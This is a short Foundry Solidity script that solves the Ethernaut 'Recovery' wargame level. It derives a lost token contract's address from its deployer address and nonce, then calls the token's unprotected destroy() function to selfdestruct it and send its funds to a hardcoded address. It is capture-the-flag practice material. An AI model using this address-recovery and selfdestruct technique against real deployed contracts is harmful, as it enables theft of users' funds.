// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {SimpleToken} from "../../test/Ethernaut/Recovery.t.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        address tokenAddr = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            0x70Dfcc0892c5d6E80546a26eeafBcE5a73B54Df0,
                            bytes1(0x01)
                        )
                    )
                )
            )
        ); // 由于simpleToken是由新部署的合约部署的，是第一笔交易，nonce要么0要么1，测试发现是1（0的话最后一位填0x80）
        SimpleToken simpleToken = SimpleToken(payable(tokenAddr));
        simpleToken.destroy(
            payable(0xB3D6fac08D421164A414970D5225845b3A91F33F)
        );
        vm.stopBroadcast();
    }
}
